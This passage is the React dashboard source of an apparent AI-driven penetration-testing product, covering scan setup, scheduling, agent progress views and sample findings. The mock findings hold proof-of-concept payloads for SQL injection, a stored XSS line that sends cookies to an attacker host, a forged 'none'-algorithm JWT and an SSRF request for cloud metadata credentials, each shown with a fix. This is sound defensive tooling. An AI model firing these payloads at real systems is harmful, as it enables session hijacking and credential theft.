'use client';
import { useState, useRef, useCallback, useEffect } from 'react';
import Link from 'next/link';
import styles from './dashboard.module.css';
import Logo from '../components/Logo';
import {
  GridIcon, RadarIcon, AlertIcon, ClockIcon, PlusIcon, CheckIcon, ArrowRightIcon,
  ChevronRightIcon, DownloadIcon, CopyIcon, GlobeIcon, GitIcon, FolderIcon, LayersIcon, ListIcon,
  FileCheckIcon, SettingsIcon, CalendarIcon, LockIcon, CodeIcon, type IconProps,
} from '../components/icons';
import { loadProfile, initials, type Profile } from '../lib/profile';

interface VulnFinding {
  id: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  cvss: number;
  type: string;
  endpoint: string;
  status: string;
  poc: string;
  description: string;
  fix: string;
  remediation?: string;
  patch: string;
}

const MOCK_SCANS = [
  {
    id: 'scan-001',
    target: 'https://api.enterprise-gateway.io',
    targetType: 'Live Web Application',
    status: 'complete',
    date: '2026-09-28',
    duration: '4m 12s',
    critical: 2,
    high: 5,
    medium: 3,
    low: 7,
    score: 42,
  },
  {
    id: 'scan-002',
    target: 'https://github.com/acme-corp/billing-service',
    targetType: 'Remote Git Repository',
    status: 'complete',
    date: '2026-09-27',
    duration: '6m 38s',
    critical: 0,
    high: 2,
    medium: 8,
    low: 4,
    score: 71,
  },
  {
    id: 'scan-003',
    target: 'https://staging.enterprise-auth.io',
    targetType: 'White-Box Correlated',
    status: 'complete',
    date: '2026-09-25',
    duration: '3m 55s',
    critical: 1,
    high: 3,
    medium: 2,
    low: 1,
    score: 55,
  },
];

const MOCK_VULNS: VulnFinding[] = [
  {
    id: 'v1',
    title: 'Broken Object Level Authorization (BOLA) & SQL Injection in /api/v2/orders',
    severity: 'critical',
    cvss: 9.8,
    type: 'Access Control & Injection (CWE-89 / CWE-639)',
    endpoint: 'GET /api/v2/orders/:id?includeDetails=true',
    status: 'open',
    poc: "curl -X GET 'https://api.enterprise-gateway.io/api/v2/orders/1042?includeDetails=1%27%20OR%201=1--' -H 'Authorization: Bearer <unprivileged_token>'",
    description: 'The endpoint does not validate whether the authenticated user owns order resource ID 1042. Furthermore, query parameters are concatenated directly into a database execution buffer without parameterization, permitting arbitrary database exfiltration.',
    fix: '1. Implement strict tenant claim validation against session context.\n2. Utilize parameterized ORM / query builders.\n3. Add centralized object-level authorization middleware.\n4. Enable rate-limiting and audit logging.',
    patch: `--- a/src/controllers/orderController.ts\n+++ b/src/controllers/orderController.ts\n@@ -18,6 +18,12 @@\n export async function getOrderDetails(req: AuthenticatedRequest, res: Response) {\n   const { id } = req.params;\n+  const sessionUserId = req.user.id;\n+\n+  // Verify tenant ownership\n+  const isOwner = await verifyOrderOwnership(sessionUserId, id);\n+  if (!isOwner) return res.status(403).json({ error: 'Access denied to order resource' });\n+\n-  const order = await db.raw("SELECT * FROM orders WHERE id = '" + id + "'");\n+  const order = await db('orders').where({ id, user_id: sessionUserId }).first();\n   return res.json(order);\n }`
  },
  {
    id: 'v2',
    title: 'Stored Cross-Site Scripting (XSS) in Tenant Notification Profile',
    severity: 'critical',
    cvss: 9.1,
    type: 'Cross-Site Scripting (CWE-79)',
    endpoint: 'POST /api/v2/tenants/settings/notifications',
    status: 'open',
    poc: '{"notificationTemplate": "<img src=x onerror=\\"fetch(\'https://attacker.io/steal?\'+document.cookie)\\">"}',
    description: 'User-controlled notification payloads are stored without sanitization and rendered in unescaped HTML email and portal templates, allowing arbitrary script execution within admin sessions.',
    fix: '1. Pass inputs through DOMPurify / server-side HTML sanitizer.\n2. Apply strict Content-Security-Policy (CSP).\n3. Use parameterized string templates.',
    patch: `--- a/src/services/notificationService.ts\n+++ b/src/services/notificationService.ts\n@@ -8,3 +8,4 @@\n+import DOMPurify from 'isomorphic-dompurify';\n export function formatNotification(template: string) {\n-  return \`<div>\${template}</div>\`;\n+  const clean = DOMPurify.sanitize(template);\n+  return \`<div>\${clean}</div>\`;\n }`
  },
  {
    id: 'v3',
    title: 'JWT Algorithm Confusion and Missing Signature Verification',
    severity: 'high',
    cvss: 8.4,
    type: 'Authentication & Cryptography (CWE-347)',
    endpoint: 'POST /api/v2/auth/verify-token',
    status: 'open',
    poc: 'Header: {"alg":"none","typ":"JWT"}\nPayload: {"sub":"admin@enterprise.com","role":"superadmin"}',
    description: 'The authentication filter accepts insecure algorithm headers ("none" and symmetric HMAC keys where RSA asymmetric public keys are expected), allowing unauthenticated signature forgery.',
    fix: '1. Enforce strict RS256/Ed25519 asymmetric algorithm verification.\n2. Reject tokens specifying "none" or algorithm mismatches.\n3. Verify token expiration and issuer audience claims.',
    patch: `--- a/src/middleware/authMiddleware.ts\n+++ b/src/middleware/authMiddleware.ts\n@@ -14,4 +14,5 @@\n export function verifyAuth(token: string) {\n-  return jwt.decode(token);\n+  return jwt.verify(token, process.env.JWT_PUBLIC_KEY!, {\n    algorithms: ['RS256'],\n    issuer: 'enterprise-auth'\n  });\n }`
  },
  {
    id: 'v4',
    title: 'Server-Side Request Forgery (SSRF) in Webhook Dispatcher',
    severity: 'high',
    cvss: 7.8,
    type: 'Server-Side Request Forgery (CWE-918)',
    endpoint: 'POST /api/v2/integrations/webhooks/test',
    status: 'open',
    poc: '{"targetUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
    description: 'The webhook tester accepts internal IP ranges and cloud metadata IP addresses (169.254.169.254, localhost, private RFC-1918 subnets), allowing exfiltration of cloud credentials.',
    fix: '1. Validate URL against an allowed scheme (HTTPS only).\n2. Resolve DNS and block private IP address ranges (0.0.0.0/8, 10.0.0.0/8, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.168.0.0/16).\n3. Execute outbound webhooks via an egress proxy.',
    patch: `--- a/src/services/webhookDispatcher.ts\n+++ b/src/services/webhookDispatcher.ts\n@@ -22,3 +22,4 @@\n export async function dispatchWebhook(url: string) {\n+  await assertPublicEgressUrl(url);\n   return axios.post(url, payload, { timeout: 4000 });\n }`
  },
  {
    id: 'v5',
    title: 'Missing Rate Limiting on Password Reset Endpoint',
    severity: 'medium',
    cvss: 6.2,
    type: 'Rate Limiting & Abuse (CWE-307)',
    endpoint: 'POST /api/v2/auth/request-reset',
    status: 'open',
    poc: 'Automated flood test of 500 requests within 10 seconds returned 200 OK without throttling.',
    description: 'The endpoint lacks client IP and email identity rate limits, permitting denial of service and enumeration attacks.',
    fix: '1. Implement Redis-backed sliding window rate limiter.\n2. Cap requests at 5 attempts per 15-minute window per IP/Email.\n3. Return consistent generic response to prevent account enumeration.',
    patch: `--- a/src/routes/authRoutes.ts\n+++ b/src/routes/authRoutes.ts\n@@ -10,3 +10,4 @@\n+import { rateLimit } from '../middleware/rateLimiter';\n-router.post('/request-reset', handleReset);\n+router.post('/request-reset', rateLimit({ max: 5, windowMs: 15 * 60 * 1000 }), handleReset);`
  },
];

type Tab = 'overview' | 'new-scan' | 'findings' | 'history';
type ScanType = 'live-url' | 'github-repo' | 'local-dir' | 'whitebox' | 'target-list';
type ScanMode = 'quick' | 'standard' | 'deep';
type Severity = 'critical' | 'high' | 'medium' | 'low';

// Sidebar entries. `hint` is a plain-language line under each label so a
// first-time user knows what every page is for.
const NAV_ITEMS: { id: Tab; label: string; hint: string; icon: (p: IconProps) => React.ReactElement }[] = [
  { id: 'overview', label: 'Overview', hint: 'Next steps & summary', icon: GridIcon },
  { id: 'new-scan', label: 'New scan', hint: 'Test an app or repo', icon: RadarIcon },
  { id: 'findings', label: 'Findings', hint: 'Issues & how to fix them', icon: AlertIcon },
  { id: 'history', label: 'Scan history', hint: "Every scan you've run", icon: ClockIcon },
];

const PAGE_META: Record<Tab, { title: string; sub: string }> = {
  overview: { title: 'Overview', sub: 'A quick look at your security — and what to do next' },
  'new-scan': { title: 'New scan', sub: 'Test an app, API or code repository in four steps' },
  findings: { title: 'Findings', sub: "What we found, proof it's real, and how to fix it" },
  history: { title: 'Scan history', sub: 'Every scan so far — click one to open its findings' },
};

const TARGET_TYPES: { id: ScanType; label: string; badge: string; desc: string; icon: (p: IconProps) => React.ReactElement }[] = [
  { id: 'live-url', label: 'Web application', badge: 'Most common', desc: "A website or API that's already online. You'll paste its address.", icon: GlobeIcon },
  { id: 'github-repo', label: 'Git repository', badge: 'Source code', desc: 'Code on GitHub, GitLab or Bitbucket — catch bugs before they ship.', icon: GitIcon },
  { id: 'local-dir', label: 'Local folder', badge: 'Before deploy', desc: 'A project folder on the machine running RedSuture.', icon: FolderIcon },
  { id: 'whitebox', label: 'Code + live app', badge: 'Most thorough', desc: 'Your repository and its running app together, for the deepest test.', icon: LayersIcon },
  { id: 'target-list', label: 'Many targets', badge: 'Bulk', desc: 'A list of sites, APIs or repos to test in one run.', icon: ListIcon },
];

// Depth is the only scan option the client picks; deeper scans need a higher plan.
const DEPTH_OPTIONS: { value: ScanMode; label: string; time: string; desc: string; recommended?: boolean; minTier: number; tier?: string }[] = [
  { value: 'quick', label: 'Quick', time: '~5 min', desc: 'Checks the most common weak spots and logins', recommended: true, minTier: 0 },
  { value: 'standard', label: 'Standard', time: '~15 min', desc: 'Thorough test of logins, data access and APIs', minTier: 1, tier: 'Starter' },
  { value: 'deep', label: 'Deep', time: '~45 min', desc: 'Links issues together to find the hardest, multi-step bugs', minTier: 2, tier: 'Pro' },
];

// Severity in plain words, shown in the findings help panel.
const SEVERITY_GUIDE: { level: 'critical' | 'high' | 'medium' | 'low'; text: string }[] = [
  { level: 'critical', text: 'Easy to abuse with serious damage. Fix today.' },
  { level: 'high', text: 'Serious, but harder to abuse. Fix this week.' },
  { level: 'medium', text: 'Limited impact. Plan a fix.' },
  { level: 'low', text: 'Minor hardening. Fix when convenient.' },
];

// The demo scans shown until real results arrive; flagged "Sample" in the UI.
const SAMPLE_SCAN_IDS = new Set(MOCK_SCANS.map(s => s.id));

// First-run checklist progress, kept in this browser.
const GUIDE_KEY = 'rs_guide';
type GuideState = { dismissed?: boolean; scanned?: boolean; reviewed?: boolean; downloaded?: boolean };
function loadGuide(): GuideState {
  try {
    return JSON.parse(localStorage.getItem(GUIDE_KEY) || '{}') as GuideState;
  } catch {
    return {};
  }
}

type ScheduleId = 'manual' | 'weekly' | 'monthly' | 'daily' | 'continuous';

// Automated-scan cadences, gated by plan tier (0 = any, 1 = any paid plan,
// 2 = Pro/Scale, 3 = Enterprise). The user's plan sets which are available.
const SCHEDULES: { id: ScheduleId; label: string; desc: string; minTier: number; tier?: string }[] = [
  { id: 'manual', label: 'Run once', desc: 'A single scan, started now.', minTier: 0 },
  { id: 'weekly', label: 'Weekly', desc: 'Re-scan this target every week.', minTier: 1 },
  { id: 'monthly', label: 'Monthly', desc: 'Re-scan this target every month.', minTier: 1 },
  { id: 'daily', label: 'Daily', desc: 'Re-scan every day for fast-moving apps.', minTier: 2, tier: 'Pro' },
  { id: 'continuous', label: 'On every pull request', desc: 'Scan each PR before it merges.', minTier: 3, tier: 'Enterprise' },
];

// Map a plan name to a tier rank. Defaults to Pro-level for signed-up users.
function planTier(plan?: string): number {
  const p = (plan || '').toLowerCase();
  if (p.includes('enterprise')) return 3;
  if (p.includes('pro') || p.includes('scale') || p.includes('business')) return 2;
  if (p.includes('team') || p.includes('starter')) return 1;
  return 2;
}

// How many precise days a plan may pick for a recurring schedule.
// Starter picks a single day; Pro gets fine control; Enterprise is unlimited.
function maxScheduleDays(plan?: string): number {
  const t = planTier(plan);
  if (t >= 3) return Infinity;
  if (t >= 2) return 8;
  return 1;
}

const WEEKDAYS = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
const MONTH_NAMES = ['January', 'February', 'March', 'April', 'May', 'June',
  'July', 'August', 'September', 'October', 'November', 'December'];
const ORDINAL = (n: number) => {
  const s = ['th', 'st', 'nd', 'rd'], v = n % 100;
  return n + (s[(v - 20) % 10] || s[v] || s[0]);
};

// A month grid for choosing which calendar days a monthly scan runs on.
// Selection is capped at `max`; days beyond the cap are disabled until one is freed.
function ScheduleCalendar({
  month, onMonth, selected, onToggle, max,
}: {
  month: Date;
  onMonth: (d: Date) => void;
  selected: number[];
  onToggle: (day: number) => void;
  max: number;
}) {
  const year = month.getFullYear(), m = month.getMonth();
  const firstDow = new Date(year, m, 1).getDay();
  const daysInMonth = new Date(year, m + 1, 0).getDate();
  const atCap = selected.length >= max;
  const cells: (number | null)[] = [];
  for (let i = 0; i < firstDow; i++) cells.push(null);
  for (let d = 1; d <= daysInMonth; d++) cells.push(d);

  return (
    <div className={styles.calendar}>
      <div className={styles.calHead}>
        <button type="button" className={`${styles.calNav} ${styles.calNavPrev}`} aria-label="Previous month"
          onClick={() => onMonth(new Date(year, m - 1, 1))}>
          <ChevronRightIcon size={16} />
        </button>
        <span className={styles.calTitle}>{MONTH_NAMES[m]} {year}</span>
        <button type="button" className={styles.calNav} aria-label="Next month"
          onClick={() => onMonth(new Date(year, m + 1, 1))}>
          <ChevronRightIcon size={16} />
        </button>
      </div>
      <div className={styles.calDow}>
        {WEEKDAYS.map(w => <span key={w}>{w[0]}</span>)}
      </div>
      <div className={styles.calGrid}>
        {cells.map((d, i) => {
          if (d === null) return <span key={`e${i}`} className={styles.calEmpty} />;
          const active = selected.includes(d);
          const blocked = !active && atCap;
          return (
            <button
              key={d}
              type="button"
              disabled={blocked}
              aria-pressed={active}
              title={blocked ? `Your plan allows ${max} day${max === 1 ? '' : 's'}` : `Run on the ${ORDINAL(d)}`}
              className={`${styles.calDay} ${active ? styles.calDayActive : ''}`}
              onClick={() => onToggle(d)}
            >
              {d}
            </button>
          );
        })}
      </div>
    </div>
  );
}

const SEVERITY_LABEL: Record<Severity, string> = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low' };

function SeverityPill({ level, count }: { level: Severity; count?: number }) {
  return (
    <span className={`${styles.sev} ${styles[`sev_${level}`]}`}>
      {count !== undefined && <strong>{count}</strong>} {SEVERITY_LABEL[level]}
    </span>
  );
}

function diffLineClass(line: string) {
  if (line.startsWith('+++') || line.startsWith('---')) return styles.diffFile;
  if (line.startsWith('@@')) return styles.diffHunk;
  if (line.startsWith('+')) return styles.diffAdd;
  if (line.startsWith('-')) return styles.diffDel;
  return styles.diffCtx;
}

type ScanStatus = 'idle' | 'running' | 'complete' | 'error';

interface AgentActivity {
  id: string;
  name: string;
  status: string;
  parentId: string | null;
  task: string | null;
  skills: string[];
  depth: number;
}

interface AgentStep {
  seq: number;
  kind: 'message' | 'tool' | 'output';
  role?: string;
  tool?: string;
  text: string;
}

interface ScanProgress {
  status: ScanStatus;
  phase: string;
  progress: number;
  messages: string[];
  findings: number;
  tokens: number;
  agents: AgentActivity[];
}

const AGENT_STATUS_LABEL: Record<string, string> = {
  running: 'Working',
  waiting: 'Waiting',
  budget_paused: 'Paused',
  completed: 'Done',
  stopped: 'Stopped',
  crashed: 'Crashed',
  failed: 'Failed',
};

export default function DashboardPage() {
  const [activeTab, setActiveTab] = useState<Tab>('overview');
  const [scanType, setScanType] = useState<ScanType>('live-url');
  
  // Target inputs
  const [targetUrl, setTargetUrl] = useState('');
  const [targetRepo, setTargetRepo] = useState('');
  const [targetDir, setTargetDir] = useState('');
  const [whiteboxRepo, setWhiteboxRepo] = useState('');
  const [whiteboxUrl, setWhiteboxUrl] = useState('');
  const [targetListContent, setTargetListContent] = useState('');
  // The user must confirm they may test the target before launching.
  const [authorized, setAuthorized] = useState(false);
  
  // Model & scan options
  const [scanMode, setScanMode] = useState<ScanMode>('quick');
  const [notesOpen, setNotesOpen] = useState(false);
  const [schedule, setSchedule] = useState<ScheduleId>('manual');
  // Precise days the recurring scan runs: weekday indexes (0=Sun) for weekly,
  // day-of-month numbers for monthly. How many you may pick is plan-gated.
  const [scheduleWeekdays, setScheduleWeekdays] = useState<number[]>([2]); // Tue
  const [scheduleDays, setScheduleDays] = useState<number[]>([1]);         // the 1st
  const [calMonth, setCalMonth] = useState(() => { const d = new Date(); return new Date(d.getFullYear(), d.getMonth(), 1); });
  const [instructions, setInstructions] = useState('');

  const [scanProgress, setScanProgress] = useState<ScanProgress>({
    status: 'idle', phase: '', progress: 0, messages: [], findings: 0, tokens: 0, agents: [],
  });
  const [scansList, setScansList] = useState(MOCK_SCANS);
  const [findingsList, setFindingsList] = useState<VulnFinding[]>(MOCK_VULNS);
  const [selectedScan, setSelectedScan] = useState(MOCK_SCANS[0]);
  const [selectedVuln, setSelectedVuln] = useState<VulnFinding>(MOCK_VULNS[0]);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [copyToast, setCopyToast] = useState<string | null>(null);
  const logRef = useRef<HTMLDivElement>(null);

  const [activeRunId, setActiveRunId] = useState<string | null>(null);
  const pollRef = useRef<NodeJS.Timeout | null>(null);

  const [profile, setProfile] = useState<Profile | null>(null);
  const [guide, setGuide] = useState<GuideState>({});
  useEffect(() => {
    // Hydration-safe read of client-only state (profile, checklist) after mount.
    // eslint-disable-next-line react-hooks/set-state-in-effect
    setProfile(loadProfile());
    setGuide(loadGuide());
  }, []);

  const updateGuide = (patch: GuideState) => {
    setGuide(prev => {
      const next = { ...prev, ...patch };
      try {
        localStorage.setItem(GUIDE_KEY, JSON.stringify(next));
      } catch {
        /* storage unavailable — progress just won't persist */
      }
      return next;
    });
  };

  // Agent drill-down: the agent whose steps are shown, and that agent's steps.
  const [selectedAgentId, setSelectedAgentId] = useState<string | null>(null);
  const selectedAgentRef = useRef<string | null>(null);
  const [agentSteps, setAgentSteps] = useState<AgentStep[]>([]);

  const showToast = (msg: string) => {
    setCopyToast(msg);
    setTimeout(() => setCopyToast(null), 3000);
  };

  const downloadFile = (filename: string, content: string, mimeType: string) => {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`Downloaded ${filename}`);
  };

  // Select an agent to reveal its live steps (toggles off when re-clicked).
  const selectAgent = (agentId: string) => {
    const next = selectedAgentId === agentId ? null : agentId;
    setSelectedAgentId(next);
    selectedAgentRef.current = next;
    setAgentSteps([]);
    if (next && activeRunId) {
      fetch(`/api/scan/${activeRunId}?agent=${encodeURIComponent(next)}`)
        .then(r => r.json())
        .then(d => {
          if (selectedAgentRef.current === next && Array.isArray(d.steps)) setAgentSteps(d.steps);
        })
        .catch(() => {});
    }
  };

  const pollScan = useCallback(async (runId: string) => {
    try {
      const agentParam = selectedAgentRef.current ? `?agent=${encodeURIComponent(selectedAgentRef.current)}` : '';
      const res = await fetch(`/api/scan/${runId}${agentParam}`);
      const data = await res.json();

      if (selectedAgentRef.current && Array.isArray(data.steps)) {
        setAgentSteps(data.steps);
      }

      setScanProgress(prev => ({
        ...prev,
        status: data.status,
        phase: data.logs?.[data.logs.length - 1]?.split('] ').pop() || prev.phase,
        progress: data.progress,
        messages: data.logs || prev.messages,
        findings: data.findings?.length || 0,
        tokens: data.tokenInfo?.total_tokens || prev.tokens,
        agents: Array.isArray(data.agents) ? data.agents : prev.agents,
      }));

      if (data.findings && data.findings.length > 0) {
        const mappedFindings: VulnFinding[] = data.findings.map((f: VulnFinding) => ({
          id: f.id,
          title: f.title,
          severity: f.severity as Severity,
          cvss: f.cvss,
          type: f.type,
          endpoint: f.endpoint,
          status: f.status || 'open',
          poc: f.poc,
          description: f.description,
          fix: f.fix || f.remediation || '',
          remediation: f.remediation || f.fix || '',
          patch: f.patch,
        }));
        setFindingsList(mappedFindings);
        setSelectedVuln(mappedFindings[0]);
      }

      if (data.status === 'error') {
        if (pollRef.current) clearInterval(pollRef.current);
        setScanProgress(prev => ({
          ...prev,
          status: 'error',
          phase: data.error || 'Scan failed — check the scan log.',
        }));
        return;
      }

      if (data.status === 'complete') {
        if (pollRef.current) clearInterval(pollRef.current);
        // Add to recent scans if not present
        setScansList(prev => {
          if (prev.some(s => s.id === runId)) return prev;
          return [
            {
              id: runId,
              target: data.target || data.targets?.[0] || 'Target scope',
              targetType: (data.targetType || 'web').toUpperCase(),
              status: 'complete',
              date: new Date().toISOString().substring(0, 10),
              duration: data.duration || '3m 10s',
              critical: data.counts?.critical || 0,
              high: data.counts?.high || 0,
              medium: data.counts?.medium || 0,
              low: data.counts?.low || 0,
              score: Math.max(30, 100 - ((data.counts?.critical || 0) * 20 + (data.counts?.high || 0) * 10)),
            },
            ...prev
          ];
        });
      }
    } catch (e) {
      console.error('Poll error', e);
    }
  }, []);

  // Only what the user actually entered — never a placeholder target, since a
  // scan actively tests whatever it is pointed at.
  const getActiveTargets = (): { targets: string[]; targetType: string } => {
    if (scanType === 'live-url') {
      const url = targetUrl.trim();
      return { targets: url ? [url] : [], targetType: 'url' };
    }
    if (scanType === 'github-repo') {
      const repo = targetRepo.trim();
      return { targets: repo ? [repo] : [], targetType: 'repo' };
    }
    if (scanType === 'local-dir') {
      const dir = targetDir.trim();
      return { targets: dir ? [dir] : [], targetType: 'dir' };
    }
    if (scanType === 'whitebox') {
      const repo = whiteboxRepo.trim();
      const url = whiteboxUrl.trim();
      return { targets: repo && url ? [repo, url] : [], targetType: 'whitebox' };
    }
    const lines = targetListContent.split('\n').map(l => l.trim()).filter(l => Boolean(l && !l.startsWith('#')));
    return { targets: lines, targetType: 'list' };
  };

  // Why the launch button is disabled, in plain words (null when ready).
  const launchBlocker = (): string | null => {
    if (getActiveTargets().targets.length === 0) {
      return scanType === 'whitebox'
        ? 'Add both the repository and the live app address in step 3.'
        : 'Add what you want to test in step 3.';
    }
    if (!authorized) return 'Confirm you have permission to test this target.';
    return null;
  };

  const startScan = async () => {
    const { targets, targetType } = getActiveTargets();
    if (scanProgress.status === 'running' || launchBlocker()) return;

    setScanProgress({
      status: 'running',
      phase: 'Launching agents…',
      progress: 3,
      messages: [
        `[orchestrator] Target: ${targets.join(', ')}`,
        `[orchestrator] RedSuture Agents · depth: ${scanMode}`,
        `[orchestrator] Starting engine — waiting for agents to come online…`,
      ],
      findings: 0,
      tokens: 0,
      agents: [],
    });
    setSelectedAgentId(null);
    selectedAgentRef.current = null;
    setAgentSteps([]);
    setActiveTab('new-scan');

    try {
      const res = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          targets,
          targetType,
          mode: scanMode,
          instructions: instructions || undefined,
          schedule,
          scheduleDays: schedule === 'monthly' ? scheduleDays : undefined,
          scheduleWeekdays: schedule === 'weekly' ? scheduleWeekdays : undefined,
        }),
      });
      const data = await res.json();

      if (data.error) {
        setScanProgress(prev => ({ ...prev, status: 'error', phase: `Error: ${data.error}` }));
        return;
      }

      if (schedule !== 'manual') {
        let when = '';
        if (schedule === 'weekly' && scheduleWeekdays.length) {
          when = ` on ${[...scheduleWeekdays].sort((a, b) => a - b).map(d => WEEKDAYS[d]).join(', ')}`;
        } else if (schedule === 'monthly' && scheduleDays.length) {
          when = ` on the ${[...scheduleDays].sort((a, b) => a - b).map(ORDINAL).join(', ')}`;
        }
        const label = SCHEDULES.find(s => s.id === schedule)?.label.toLowerCase();
        showToast(`${label?.[0].toUpperCase()}${label?.slice(1)} scans scheduled${when} for ${targets[0]}`);
      }

      setActiveRunId(data.runId);
      updateGuide({ scanned: true });
      if (pollRef.current) clearInterval(pollRef.current);
      pollRef.current = setInterval(() => pollScan(data.runId), 2000);
      // Immediately run first poll
      setTimeout(() => pollScan(data.runId), 800);
    } catch (e) {
      const message = e instanceof Error ? e.message : String(e);
      setScanProgress(prev => ({ ...prev, status: 'error', phase: `Failed: ${message}` }));
    }
  };

  const scoreClass = (score: number) => {
    if (score < 40) return styles.scoreBad;
    if (score < 70) return styles.scoreWarn;
    return styles.scoreGood;
  };

  // Switching pages also ticks the "review what was found" checklist step.
  const openTab = (tab: Tab) => {
    setActiveTab(tab);
    if (tab === 'findings') updateGuide({ reviewed: true });
  };

  const goToFindings = (scan: typeof MOCK_SCANS[0]) => {
    setSelectedScan(scan);
    openTab('findings');
  };

  // Downloads of a finding's fix also tick the "download a fix" step.
  const downloadFix = (filename: string, content: string, mimeType: string) => {
    downloadFile(filename, content, mimeType);
    updateGuide({ downloaded: true });
  };

  const pageMeta = PAGE_META[activeTab];
  const blocker = launchBlocker();
  const activeTargets = getActiveTargets().targets;
  const hasSampleScans = scansList.some(s => SAMPLE_SCAN_IDS.has(s.id));
  const showingSampleFindings = findingsList === MOCK_VULNS;

  // Summary numbers derived from the scans actually listed.
  const totals = scansList.reduce(
    (acc, sc) => ({ critical: acc.critical + sc.critical, high: acc.high + sc.high, all: acc.all + sc.critical + sc.high + sc.medium + sc.low }),
    { critical: 0, high: 0, all: 0 },
  );
  const stats: { label: string; value: number; hint: string; tone: 'neutral' | 'critical' | 'high' | 'good'; icon: (p: IconProps) => React.ReactElement }[] = [
    { label: 'Completed scans', value: scansList.length, hint: `Across ${new Set(scansList.map(sc => sc.target)).size} targets`, tone: 'neutral', icon: RadarIcon },
    { label: 'Critical issues', value: totals.critical, hint: 'Fix these first', tone: 'critical', icon: AlertIcon },
    { label: 'High issues', value: totals.high, hint: 'Fix these next', tone: 'high', icon: AlertIcon },
    { label: 'Fixes ready', value: totals.all, hint: 'Patches & guides to download', tone: 'good', icon: FileCheckIcon },
  ];

  const guideSteps: { key: string; title: string; desc: string; done: boolean; action: React.ReactNode }[] = [
    {
      key: 'workspace',
      title: 'Set up your workspace',
      desc: 'Add your company name and website.',
      done: Boolean(profile?.company),
      action: <Link href="/dashboard/settings" className="btn-secondary">Open settings</Link>,
    },
    {
      key: 'scan',
      title: 'Run your first scan',
      desc: "Pick what to test and launch it — the default settings are fine.",
      done: Boolean(guide.scanned),
      action: <button className="btn-primary" onClick={() => openTab('new-scan')}>Start a scan</button>,
    },
    {
      key: 'review',
      title: 'Review what was found',
      desc: 'Each issue comes with proof it is real and a plain explanation.',
      done: Boolean(guide.reviewed),
      action: <button className="btn-secondary" onClick={() => openTab('findings')}>Open findings</button>,
    },
    {
      key: 'fix',
      title: 'Download a fix',
      desc: 'Grab the ready-made patch or guide and hand it to your developer.',
      done: Boolean(guide.downloaded),
      action: <button className="btn-secondary" onClick={() => openTab('findings')}>Get a fix</button>,
    },
  ];
  const guideDone = guideSteps.filter(st => st.done).length;

  const liveScanCard = scanProgress.status !== 'idle' && (
    <section className={styles.panel}>
      <div className={styles.liveHeader}>
        <div className={styles.liveIndicator}>
          {scanProgress.status === 'running' && <><span className={styles.liveDot} /> Scan in progress</>}
          {scanProgress.status === 'complete' && <span className={styles.liveDone}><CheckIcon size={14} /> Scan complete</span>}
          {scanProgress.status === 'error' && <span className={styles.liveError}><AlertIcon size={14} /> Scan failed</span>}
        </div>
        <span className={styles.livePhase}>{scanProgress.phase}</span>
        <span className={styles.liveProgress}>{scanProgress.progress}%</span>
      </div>
      <div className={styles.progressBar}>
        <div className={styles.progressFill} style={{ width: `${scanProgress.progress}%` }} />
      </div>

      {scanProgress.agents.length > 0 && (
        <div className={styles.agentsPanel}>
          <div className={styles.agentsHead}>
            <span>Agent team</span>
            <span className={styles.agentsActive}>
              {scanProgress.agents.filter(a => a.status === 'running' || a.status === 'waiting').length} active
              {' · '}{scanProgress.agents.length} total
            </span>
          </div>
          <ul className={styles.agentList}>
            {scanProgress.agents.map(a => {
              const isSelected = selectedAgentId === a.id;
              return (
                <li key={a.id} className={styles.agentItem}>
                  <button
                    type="button"
                    className={`${styles.agentRow} ${isSelected ? styles.agentRowSelected : ''}`}
                    style={{ paddingLeft: `${12 + a.depth * 18}px` }}
                    onClick={() => selectAgent(a.id)}
                    aria-expanded={isSelected}
                  >
                    <span className={`${styles.agentDot} ${styles[`agent_${a.status}`] || ''}`} />
                    <div className={styles.agentBody}>
                      <div className={styles.agentTop}>
                        <span className={styles.agentName}>{a.name}</span>
                        <span className={`${styles.agentStatus} ${styles[`agent_${a.status}`] || ''}`}>
                          {AGENT_STATUS_LABEL[a.status] || a.status}
                        </span>
                        <ChevronRightIcon
                          size={14}
                          className={`${styles.agentChevron} ${isSelected ? styles.agentChevronOpen : ''}`}
                        />
                      </div>
                      {a.task && <div className={styles.agentTask}>{a.task}</div>}
                      {a.skills.length > 0 && (
                        <div className={styles.agentSkills}>
                          {a.skills.slice(0, 5).map(sk => (
                            <span key={sk} className={styles.agentSkill}>{sk}</span>
                          ))}
                        </div>
                      )}
                    </div>
                  </button>

                  {isSelected && (
                    <div className={styles.agentSteps}>
                      {agentSteps.length === 0 ? (
                        <div className={styles.agentStepsEmpty}>Waiting for this agent’s first step…</div>
                      ) : (
                        <ol className={styles.stepList}>
                          {agentSteps.map(step => (
                            <li key={step.seq} className={styles.stepRow}>
                              <span className={`${styles.stepKind} ${styles[`step_${step.kind}`] || ''}`}>
                                {step.kind === 'tool' ? (step.tool || 'tool') : step.kind === 'output' ? 'result' : step.role || 'message'}
                              </span>
                              <span className={styles.stepText}>{step.text}</span>
                            </li>
                          ))}
                        </ol>
                      )}
                    </div>
                  )}
                </li>
              );
            })}
          </ul>
        </div>
      )}

      <div className={styles.scanLog} ref={logRef}>
        {scanProgress.messages.map((msg, i) => (
          <div key={i} className={styles.logLine}>
            <span className={styles.logTag}>{msg.split(']')[0]}]</span>
            <span className={`${styles.logMsg} ${msg.includes('AGENT') || msg.includes('AI') ? styles.logAgent : msg.includes('complete') ? styles.logSuccess : ''}`}>
              {msg.split(']')[1] || msg}
            </span>
          </div>
        ))}
      </div>
      <div className={styles.scanMeta}>
        <span>{scanProgress.findings} verified findings</span>
        <span>{(scanProgress.tokens / 1000).toFixed(0)}K tokens used</span>
        {activeRunId && <span>Run <code>{activeRunId}</code></span>}
      </div>
    </section>
  );

  return (
    <div className={`${styles.layout} ${sidebarCollapsed ? styles.layoutCollapsed : ''}`}>
      {copyToast && (
        <div className={styles.toast} role="status">
